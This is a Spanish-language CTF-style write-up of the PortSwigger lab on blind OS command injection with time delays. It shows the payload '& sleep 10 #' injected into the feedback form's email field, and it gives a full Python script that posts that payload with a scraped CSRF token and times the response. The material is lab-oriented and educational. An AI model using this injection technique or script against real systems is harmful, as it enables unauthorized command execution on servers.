---
title: "02 Blind OS command injection with time delays"
collection: publications
category: portswigger
permalink: publications/Command Injection/02_Blind OS command injection with time delays
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección de comandos de SO ciego en la función de retroalimentación. La aplicación ejecuta un comando shell que contiene los detalles proporcionados por el usuario. La salida del comando no se devuelve en la respuesta.'
date: 2024-12-08
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind OS command injection with time delays'
---

![logo]({{site.url}}/images/Command Injection/command-lab-2/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Command Injection/command-lab-2/descripcion.png)

## Objetivo del laboratorio

Para resolver el problema, explotamos la vulnerabilidad de inyección ciega de comandos del sistema operativo para provocar un retraso de 10 segundos.

## Analisis

Probamos la entrade del formulario y la capturamos con el Burpsuite

![Conf1]({{site.url}}/images/Command Injection/command-lab-2/conf1.png)

Probamos con cada campo a ver cual es vulnerable, probamos el comando `& sleep 10 #` si se demora 10 segundos es vulnerable.

![Conf2]({{site.url}}/images/Command Injection/command-lab-2/conf2.png)

# Aprobado

![Aprobado]({{site.url}}/images/Command Injection/command-lab-2/aprobado.png)

# Codigo Python

```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def check_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.ca & sleep 10 #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >=10):
        print("(+) Email field vulnerable to time-based command injection!")
    else:
        print("(-) Email field not vulnerable to time-based command injection")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time-based command injection...")

    s = requests.Session()
    check_command_injection(s, url)

if __name__ == "__main__":
    main()
```